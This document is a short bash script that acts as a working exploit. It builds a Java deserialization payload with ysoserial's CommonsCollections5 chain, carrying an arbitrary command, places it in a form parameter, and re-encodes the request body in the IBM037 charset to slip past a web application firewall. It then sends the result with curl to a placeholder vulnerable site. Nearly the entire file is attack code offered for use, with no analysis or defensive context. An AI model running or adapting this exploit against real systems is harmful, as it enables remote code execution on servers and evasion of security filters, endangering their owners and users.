#!/bin/bash

function urldecode {
    plus_sub=' '
    [[ ! -z $1 ]] && plus_sub=+ #by default no translation of + to ' '
    tr "\\\\%${plus_sub}" '%\\ '|sed 's_\\_\\x_g'|xargs -0 printf %b|tr % '\\'
}

#an example waf bypass by @irsdl
function enc {
    target_enc=IBM037
    [[ ! -z $1 ]] && target_enc=$1
    iconv -f UTF-8 -t "$target_enc"|xxd -p|tr -d '\n'|sed 's/../%&/g'
}

function preproc {
    data=""
    while IFS= read -r -d '&' param || [[ ! -z $param ]];do
        param_name=${param%%=*}
        param_name_dec=$(echo "$param_name"|urldecode)
        [[ $param_name == "${param}" ]] && {
            data=$(printf '%s&%s' "${data}" "$(printf %s "$param_name_dec"|enc)")
        } || {
            param_val=${param#"${param_name}="}
            param_val_dec=$(echo "$param_val"|urldecode)
            data=$(printf '%s&%s=%s' "${data}" "$(printf %s "$param_name_dec"|enc)" "$(printf %s "$param_val_dec"|enc)")
        }
    done
    echo "${data:1}"
}

static_data='param1=val1&state='
payload=$(java -jar ysoserial.jar CommonsCollections5 "$1"|base64 -w0)
data=$(printf "%s" "${static_data}${payload}"|preproc)

curl -i -s -k -H 'Content-Type: application/x-www-form-urlencoded; charset=ibm037' -d "$data" 'https://vuln_site'